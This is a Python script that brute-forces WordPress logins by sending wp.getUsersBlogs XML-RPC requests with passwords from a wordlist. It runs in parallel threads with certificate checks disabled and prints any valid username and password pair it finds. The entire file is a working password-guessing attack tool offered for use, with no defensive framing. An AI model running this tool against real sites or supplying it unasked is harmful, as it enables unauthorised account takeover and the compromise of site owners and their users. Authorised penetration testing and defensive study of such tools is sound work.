#!/usr/bin/env python3
import sys
import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import xml.etree.ElementTree as ET
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XMLRPCBruteForcer:
    def __init__(self, target_url, username, wordlist, threads=5, timeout=10):
        self.target_url = target_url.rstrip('/')
        self.xmlrpc_endpoint = f"{self.target_url}/xmlrpc.php"
        self.username = username
        self.wordlist = wordlist
        self.threads = threads
        self.timeout = timeout
        self.valid_creds = []
        self.stop_flag = False
        
    def create_payload(self, username, password):
        return f'''<?xml version="1.0"?>
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
        <param><value><string>{username}</string></value></param>
        <param><value><string>{password}</string></value></param>
    </params>
</methodCall>'''

    def is_success(self, response_text):
        try:
            root = ET.fromstring(response_text)
            fault = root.find('.//fault')
            if fault is not None:
                return False
            struct = root.find('.//struct')
            if struct is not None:
                return True
        except ET.ParseError:
            pass
        return False

    def test_credentials(self, username, password):
        if self.stop_flag:
            return False, username, password
        try:
            payload = self.create_payload(username, password)
            headers = {"Content-Type": "text/xml"}
            response = requests.post(
                self.xmlrpc_endpoint,
                data=payload,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )
            return self.is_success(response.text), username, password
        except Exception:
            return False, username, password

    def load_wordlist(self):
        try:
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] Wordlist not found: {self.wordlist}")
            sys.exit(1)

    def bruteforce(self):
        passwords = self.load_wordlist()
        total = len(passwords)
        tested = 0
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {
                executor.submit(self.test_credentials, self.username, pwd): pwd 
                for pwd in passwords
            }
            
            for future in as_completed(futures):
                if self.stop_flag:
                    break
                    
                tested += 1
                is_valid, username, password = future.result()
                
                if is_valid:
                    self.valid_creds.append((username, password))
                    self.stop_flag = True
                    print(f"[+] VALID: {username}:{password}")
                    break
                else:
                    remaining_percent = int((total - tested) * 100 / total)
                    print(f"\r[*] {remaining_percent}% restant...", end='', flush=True)
            
            executor.shutdown(wait=False)

    def print_summary(self):
        print(f"\n\n[+] Credentials valides trouvées: {len(self.valid_creds)}")
        if self.valid_creds:
            for username, password in self.valid_creds:
                print(f"    {username}:{password}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', required=True)
    parser.add_argument('-u', '--username', required=True)
    parser.add_argument('-w', '--wordlist', required=True)
    parser.add_argument('--threads', type=int, default=5)
    parser.add_argument('--timeout', type=int, default=10)
    
    args = parser.parse_args()
    
    bruteforcer = XMLRPCBruteForcer(args.target, args.username, args.wordlist, args.threads, args.timeout)
    
    try:
        bruteforcer.bruteforce()
        bruteforcer.print_summary()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        bruteforcer.print_summary()
        sys.exit(1)

if __name__ == '__main__':
    main()
